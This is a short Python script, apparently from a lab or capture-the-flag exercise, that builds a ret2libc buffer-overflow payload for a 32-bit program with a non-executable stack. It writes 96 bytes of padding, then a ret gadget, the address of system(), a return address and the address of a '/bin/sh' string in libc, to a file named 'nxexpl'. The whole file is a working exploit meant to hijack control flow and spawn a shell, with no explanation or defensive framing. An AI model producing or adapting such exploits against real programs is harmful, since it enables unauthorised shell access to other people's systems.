#!/usr/bin/env python

buf = "A" * 96

buf += "\xf2\x82\x04\x08" # ret

buf += "\x20\x50\x08\x40" # system()

buf += "\x84\x84\x04\x08" # 08048484 return address

buf += "\x0f\x96\x1a\x40" # "/bin/sh" from libc

#buf += "C" * (400 - 96 - 4 - 4 - 4 - 4 )

with open('nxexpl', 'w') as f:
  f.write(buf)

